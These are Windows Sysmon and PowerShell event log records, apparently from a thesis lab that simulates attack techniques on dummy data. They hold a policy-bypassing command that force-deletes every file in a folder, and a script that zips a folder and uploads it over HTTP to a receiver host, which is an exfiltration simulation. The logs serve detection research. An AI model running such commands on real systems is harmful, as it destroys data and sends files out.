{"Timestamp":"2026-07-12T13:28:11.477801561Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-Sysmon/Operational","EID":1,"Level":"low","Title":"Non Interactive PowerShell Process Spawned 2","RecordID":105205,"Details":"Cmdline: powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\" ¦ Proc: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ¦ User: LT29\\seguridad ¦ ParentCmdline: \"cmd.exe\" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\" ¦ LID: 2673153 ¦ LGUID: 6BC49A7D-7A59-6A53-01CA-280000000000 ¦ PID: 5704 ¦ PGUID: 6BC49A7D-966B-6A53-BC06-000000009A01 ¦ ParentPID: 7404 ¦ ParentPGUID: 6BC49A7D-966B-6A53-BB06-000000009A01 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9"},"EventID":{"Value":1},"Version":5,"Level":4,"Task":1,"Opcode":0,"Keywords":9223372036854775808,"TimeCreated":{"SystemTime":1783862891.4778016},"EventRecordID":105205,"Correlation":{},"Execution":{"ProcessID":4652,"ThreadID":6392},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-18"}},"EventData":{"RuleName":"-","UtcTime":"2026-07-12 13:28:11.446","ProcessGuid":"6BC49A7D-966B-6A53-BC06-000000009A01","ProcessId":5704,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","FileVersion":"10.0.19041.3393 (WinBuild.160101.0800)","Description":"Windows PowerShell","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"","CurrentDirectory":"C:\\Windows\\system32\\","User":"LT29\\seguridad","LogonGuid":"6BC49A7D-7A59-6A53-01CA-280000000000","LogonId":2673153,"TerminalSessionId":1,"IntegrityLevel":"High","Hashes":"MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934","ParentProcessGuid":"6BC49A7D-966B-6A53-BB06-000000009A01","ParentProcessId":7404,"ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"cmd.exe\" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"","ParentUser":"LT29\\seguridad"},"Message":"Process Create:\nRuleName: -!s!\nUtcTime: 2026-07-12 13:28:11.446!s!\nProcessGuid: 6BC49A7D-966B-6A53-BC06-000000009A01!s!\nProcessId: 5704!s!\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe!s!\nFileVersion: 10.0.19041.3393 (WinBuild.160101.0800)!s!\nDescription: Windows PowerShell!s!\nProduct: Microsoft® Windows® Operating System!s!\nCompany: Microsoft Corporation!s!\nOriginalFileName: PowerShell.EXE!s!\nCommandLine: powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"!s!\nCurrentDirectory: C:\\Windows\\system32\\!s!\nUser: LT29\\seguridad!s!\nLogonGuid: 6BC49A7D-7A59-6A53-01CA-280000000000!s!\nLogonId: 2673153!s!\nTerminalSessionId: 1!s!\nIntegrityLevel: High!s!\nHashes: MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934!s!\nParentProcessGuid: 6BC49A7D-966B-6A53-BB06-000000009A01!s!\nParentProcessId: 7404!s!\nParentImage: C:\\Windows\\System32\\cmd.exe!s!\nParentCommandLine: \"cmd.exe\" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"!s!\nParentUser: LT29\\seguridad!s!\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:28:11.477801561Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-Sysmon/Operational","EID":1,"Level":"medium","Title":"Change PowerShell Policies to an Insecure Level 2","RecordID":105205,"Details":"Cmdline: powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\" ¦ Proc: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ¦ User: LT29\\seguridad ¦ ParentCmdline: \"cmd.exe\" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\" ¦ LID: 2673153 ¦ LGUID: 6BC49A7D-7A59-6A53-01CA-280000000000 ¦ PID: 5704 ¦ PGUID: 6BC49A7D-966B-6A53-BC06-000000009A01 ¦ ParentPID: 7404 ¦ ParentPGUID: 6BC49A7D-966B-6A53-BB06-000000009A01 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9"},"EventID":{"Value":1},"Version":5,"Level":4,"Task":1,"Opcode":0,"Keywords":9223372036854775808,"TimeCreated":{"SystemTime":1783862891.4778016},"EventRecordID":105205,"Correlation":{},"Execution":{"ProcessID":4652,"ThreadID":6392},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-18"}},"EventData":{"RuleName":"-","UtcTime":"2026-07-12 13:28:11.446","ProcessGuid":"6BC49A7D-966B-6A53-BC06-000000009A01","ProcessId":5704,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","FileVersion":"10.0.19041.3393 (WinBuild.160101.0800)","Description":"Windows PowerShell","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"","CurrentDirectory":"C:\\Windows\\system32\\","User":"LT29\\seguridad","LogonGuid":"6BC49A7D-7A59-6A53-01CA-280000000000","LogonId":2673153,"TerminalSessionId":1,"IntegrityLevel":"High","Hashes":"MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934","ParentProcessGuid":"6BC49A7D-966B-6A53-BB06-000000009A01","ParentProcessId":7404,"ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"cmd.exe\" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"","ParentUser":"LT29\\seguridad"},"Message":"Process Create:\nRuleName: -!s!\nUtcTime: 2026-07-12 13:28:11.446!s!\nProcessGuid: 6BC49A7D-966B-6A53-BC06-000000009A01!s!\nProcessId: 5704!s!\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe!s!\nFileVersion: 10.0.19041.3393 (WinBuild.160101.0800)!s!\nDescription: Windows PowerShell!s!\nProduct: Microsoft® Windows® Operating System!s!\nCompany: Microsoft Corporation!s!\nOriginalFileName: PowerShell.EXE!s!\nCommandLine: powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"!s!\nCurrentDirectory: C:\\Windows\\system32\\!s!\nUser: LT29\\seguridad!s!\nLogonGuid: 6BC49A7D-7A59-6A53-01CA-280000000000!s!\nLogonId: 2673153!s!\nTerminalSessionId: 1!s!\nIntegrityLevel: High!s!\nHashes: MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934!s!\nParentProcessGuid: 6BC49A7D-966B-6A53-BB06-000000009A01!s!\nParentProcessId: 7404!s!\nParentImage: C:\\Windows\\System32\\cmd.exe!s!\nParentCommandLine: \"cmd.exe\" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"!s!\nParentUser: LT29\\seguridad!s!\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:28:53.688080072Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3284597,"Details":"ScriptBlock: $Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862933.68808},"EventRecordID":3284597,"Correlation":{"ActivityID":"F2694954-11F0-0002-CAEA-6EF2F011DD01"},"Execution":{"ProcessID":9488,"ThreadID":3008},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"","ScriptBlockId":"139aefd8-5a8a-482c-a61e-e59bdd46bbf3","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n$Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"\n\nId. de bloque de script: 139aefd8-5a8a-482c-a61e-e59bdd46bbf3\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:28:53.837097644Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3284601,"Details":"ScriptBlock: {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862933.8370976},"EventRecordID":3284601,"Correlation":{"ActivityID":"F2694954-11F0-0000-E3FB-6BF2F011DD01"},"Execution":{"ProcessID":9488,"ThreadID":3008},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}","ScriptBlockId":"32625134-bd33-40d5-bc82-47da86093f05","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n{\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\n\nId. de bloque de script: 32625134-bd33-40d5-bc82-47da86093f05\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:29:16.338700771Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3287607,"Details":"ScriptBlock: $global:?","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862956.3387008},"EventRecordID":3287607,"Correlation":{"ActivityID":"F2694954-11F0-0003-CE21-6FF2F011DD01"},"Execution":{"ProcessID":9488,"ThreadID":3008},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$global:?","ScriptBlockId":"2b390ef8-968e-467f-af15-5e797a11ce17","Path":""},"Message":"Creando texto de bloque de script (1 de 1):\n$global:?\n\nId. de bloque de script: 2b390ef8-968e-467f-af15-5e797a11ce17\nRuta de acceso: \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:29:20.622279882Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3287653,"Details":"ScriptBlock: # TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862960.62228},"EventRecordID":3287653,"Correlation":{"ActivityID":"F2694954-11F0-0003-AA22-6FF2F011DD01"},"Execution":{"ProcessID":4956,"ThreadID":12076},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir 